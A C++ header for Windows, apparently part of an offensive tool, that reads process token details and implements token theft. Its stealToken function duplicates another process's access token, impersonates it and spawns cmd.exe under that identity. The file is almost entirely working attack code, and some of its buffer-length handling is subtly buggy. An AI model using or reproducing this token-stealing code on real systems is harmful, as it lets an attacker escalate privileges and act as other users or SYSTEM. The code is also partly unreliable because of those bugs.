#pragma once
#include <Windows.h>
#include <TlHelp32.h>
#include <string>

#pragma comment(lib, "advapi32.lib")

void getTokenInformation(HANDLE hToken)
{
	DWORD returnLength = 0;
	GetTokenInformation(hToken, TokenUser, nullptr, 0, &returnLength);
	LPVOID lpTokenInfo = NULL;
	lpTokenInfo = LocalAlloc(LMEM_FIXED, returnLength);
	GetTokenInformation(hToken, TokenUser, lpTokenInfo, returnLength, &returnLength);
	constexpr SIZE_T MAX_LEN = 256;
	DWORD dwSize = MAX_LEN;
	wchar_t lpName[MAX_LEN];
	wchar_t lpDomain[MAX_LEN];
	SID_NAME_USE sidType;
	LookupAccountSid(nullptr, ((TOKEN_USER*)lpTokenInfo)->User.Sid, lpName, &dwSize, lpDomain, &dwSize, &sidType);
	wprintf(L"[+]\tUser: %s\\%s\n", lpDomain, lpName);
	LocalFree((HLOCAL)lpTokenInfo);
}

void createProcessWithToken(HANDLE hToken)
{
		LPSTARTUPINFOW sinfo = new STARTUPINFOW();
		sinfo->cb = sizeof(STARTUPINFOW);
		sinfo->dwFlags = STARTF_USESHOWWINDOW;
		sinfo->wShowWindow = 1;
		PPROCESS_INFORMATION pinfo = new PROCESS_INFORMATION();
		wchar_t cmd[] = L"C:\\Windows\\System32\\cmd.exe\0";
		if (!CreateProcessWithTokenW(hToken, LOGON_WITH_PROFILE, NULL, cmd, NULL, NULL, NULL, sinfo, pinfo))
		{
			printf("[-] CreateProcessWithTokenW error: %d\n", GetLastError());
		}
		printf("[*] starting new process: %d\n", pinfo->dwProcessId);
}

void stealToken(HANDLE hToken)
{
	printf("[*] stealing token\n");
	HANDLE hTokenDup;
	if (DuplicateTokenEx(hToken, TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID, nullptr, SecurityImpersonation, TokenImpersonation, &hTokenDup))
	{
		SetThreadToken(nullptr, hTokenDup);	
		createProcessWithToken(hTokenDup);
	}
	else
	{
		printf("[-] error DuplicateTokenEx: %d\n", GetLastError());
		exit(1);
	}
}

void getTokenStatistics(HANDLE hToken)
{
	DWORD returnLength = 0;

	GetTokenInformation(hToken, TokenStatistics, nullptr, returnLength, &returnLength);
	TOKEN_STATISTICS* lpTokenInfo = (TOKEN_STATISTICS*)LocalAlloc(LMEM_FIXED, returnLength);
	GetTokenInformation(hToken, TokenStatistics, lpTokenInfo, returnLength, &returnLength);
	printf("[+]\tToken Type: %s\n", lpTokenInfo->TokenType == 1 ? "TokenPrimary" : "TokenImpersonation");
	if (lpTokenInfo->TokenType == 2)
	{ 
		const char* impersonationLevel;
		switch (lpTokenInfo->ImpersonationLevel)
		{
		case 0:
			impersonationLevel = "SecurityAnonymous";
			break;
		case 1:
			impersonationLevel = "SecurityIdentification";
			break;
		case 2:
			impersonationLevel = "SecurityImpersonation";
			break;
		case 3:
			impersonationLevel = "SecurityDelegation";
			break;
		}
		printf("[+]\tImpersonation Level: %s\n",impersonationLevel);
	}
	LocalFree((HLOCAL)lpTokenInfo);
} 

void getTokenIntegrityLevel(HANDLE hToken)
{
	DWORD returnLength = 0;

	GetTokenInformation(hToken, TokenIntegrityLevel, nullptr, returnLength, &returnLength);
	TOKEN_MANDATORY_LABEL* lpTokenInfo = (TOKEN_MANDATORY_LABEL*)LocalAlloc(LMEM_FIXED, returnLength);
	GetTokenInformation(hToken, TokenIntegrityLevel, lpTokenInfo, returnLength, &returnLength);

	PUCHAR lpCount = GetSidSubAuthorityCount(lpTokenInfo->Label.Sid);
	PDWORD lpSubAuthority = GetSidSubAuthority(lpTokenInfo->Label.Sid, *lpCount - 1);

	const char* integrityLevel;
	if (*lpSubAuthority >= SECURITY_MANDATORY_SYSTEM_RID)
	{
		integrityLevel = "SYSTEM";
	}
	else if (*lpSubAuthority >= SECURITY_MANDATORY_HIGH_RID)
	{
		integrityLevel = "HIGH";
	}
	else if (*lpSubAuthority >= SECURITY_MANDATORY_MEDIUM_RID)
	{
		integrityLevel = "MEDIUM";
	}
	else if (*lpSubAuthority >= SECURITY_MANDATORY_LOW_RID)
	{
		integrityLevel = "LOW";
	}
	else
	{
		integrityLevel = "UNTRUSTED";
	}

	printf("[+]\tIntegrity Level: %s\n", integrityLevel);
	LocalFree((HLOCAL)lpTokenInfo);
}

void getTokenElevationType(HANDLE hToken)
{
	DWORD returnLength;

	TOKEN_ELEVATION* lpTokenInfo = (TOKEN_ELEVATION*)LocalAlloc(LMEM_FIXED, sizeof(TOKEN_ELEVATION));
	GetTokenInformation(hToken, TokenElevation, lpTokenInfo, returnLength, &returnLength);
	printf("[+]\tIs Elevated: %s\n", lpTokenInfo->TokenIsElevated == 0 ? "False" : "True");

	returnLength = 0;
	TOKEN_ELEVATION_TYPE * tet = (TOKEN_ELEVATION_TYPE*)LocalAlloc(LMEM_FIXED, sizeof(TOKEN_ELEVATION_TYPE));
	GetTokenInformation(hToken, TokenElevationType, tet, returnLength, &returnLength);
	const char* tokenElevationType;
	switch (*tet)
	{
	case TokenElevationTypeDefault:
		tokenElevationType = "TokenElevationTypeDefault";
		break;
	case TokenElevationTypeFull:
		tokenElevationType = "TokenElevationTypeFull";
		break;
	case TokenElevationTypeLimited:
		tokenElevationType = "TokenElevationTypeLimited";
		break;
	}
	printf("[+]\tElevation Type: %s\n", tokenElevationType);
	LocalFree((HLOCAL)lpTokenInfo);
}